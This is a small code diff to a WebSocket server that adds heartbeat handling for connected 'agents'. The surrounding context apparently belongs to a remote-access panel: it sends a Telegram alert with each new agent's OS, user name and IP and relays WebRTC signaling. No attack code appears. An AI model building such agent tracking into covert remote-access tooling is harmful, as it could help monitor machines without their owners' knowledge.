@@ -63,6 +63,13 @@ wss.on('connection', (ws, req) => {
                 // Telegram Notification
                 notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
             } 
+            // Handle Heartbeat
+            else if (data.type === 'heartbeat') {
+                clients[id].lastSeen = Date.now();
+                // Send back an ack or just ignore, but ensure we know they are alive
+                // Optional: Broadcast heartbeat status to admin if you want a "Pong" log
+                // broadcastToAdmin(id, { type: 'pong' });
+            }
             // Forward Signaling Data
             else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                 forwardToTarget(id, data);
